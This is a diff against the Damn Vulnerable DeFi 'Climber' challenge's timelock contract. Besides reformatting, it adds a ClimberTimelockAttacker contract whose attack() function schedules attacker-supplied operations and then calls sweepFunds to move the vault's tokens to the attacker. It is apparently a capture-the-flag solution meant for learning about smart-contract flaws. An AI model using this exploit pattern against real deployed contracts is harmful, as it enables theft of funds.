@@ -4,6 +4,8 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/access/AccessControl.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 
+import {NewClimberVault} from "./ClimberVault.sol";
+
 /**
  * @title ClimberTimelock
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -24,9 +26,9 @@ contract ClimberTimelock is AccessControl {
 
     // Operation data tracked in this contract
     struct Operation {
-        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution
-        bool known;         // whether the operation is registered in the timelock
-        bool executed;      // whether the operation has been executed
+        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution
+        bool known; // whether the operation is registered in the timelock
+        bool executed; // whether the operation has been executed
     }
 
     // Operations are tracked by their bytes32 identifier
@@ -34,10 +36,7 @@ contract ClimberTimelock is AccessControl {
 
     uint64 public delay = 1 hours;
 
-    constructor(
-        address admin,
-        address proposer
-    ) {
+    constructor(address admin, address proposer) {
         _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
         _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
 
@@ -48,14 +47,18 @@ contract ClimberTimelock is AccessControl {
         _setupRole(PROPOSER_ROLE, proposer);
     }
 
-    function getOperationState(bytes32 id) public view returns (OperationState) {
+    function getOperationState(bytes32 id)
+        public
+        view
+        returns (OperationState)
+    {
         Operation memory op = operations[id];
-        
-        if(op.executed) {
+
+        if (op.executed) {
             return OperationState.Executed;
-        } else if(op.readyAtTimestamp >= block.timestamp) {
+        } else if (op.readyAtTimestamp >= block.timestamp) {
             return OperationState.ReadyForExecution;
-        } else if(op.readyAtTimestamp > 0) {
+        } else if (op.readyAtTimestamp > 0) {
             return OperationState.Scheduled;
         } else {
             return OperationState.Unknown;
@@ -82,8 +85,11 @@ contract ClimberTimelock is AccessControl {
         require(targets.length == dataElements.length);
 
         bytes32 id = getOperationId(targets, values, dataElements, salt);
-        require(getOperationState(id) == OperationState.Unknown, "Operation already known");
-        
+        require(
+            getOperationState(id) == OperationState.Unknown,
+            "Operation already known"
+        );
+
         operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
         operations[id].known = true;
     }
@@ -104,7 +110,7 @@ contract ClimberTimelock is AccessControl {
         for (uint8 i = 0; i < targets.length; i++) {
             targets[i].functionCallWithValue(dataElements[i], values[i]);
         }
-        
+
         require(getOperationState(id) == OperationState.ReadyForExecution);
         operations[id].executed = true;
     }
@@ -116,4 +122,44 @@ contract ClimberTimelock is AccessControl {
     }
 
     receive() external payable {}
+}
+
+contract ClimberTimelockAttacker {
+    address private immutable owner;
+    address private immutable vault;
+    address payable private immutable timelock;
+    address private immutable token;
+
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private salt;
+
+    constructor(
+        address _vault,
+        address payable _timelock,
+        address _token
+    ) {
+        owner = msg.sender;
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+    }
+
+    function setData(
+        address[] memory _targets,
+        uint256[] memory _values,
+        bytes[] memory _dataElements,
+        bytes32 _salt
+    ) external {
+        targets = _targets;
+        values = _values;
+        dataElements = _dataElements;
+        salt = _salt;
+    }
+
+    function attack() external {
+        ClimberTimelock(timelock).schedule(targets, values, dataElements, 0);
+        NewClimberVault(vault).sweepFunds(token, owner);
+    }
 }
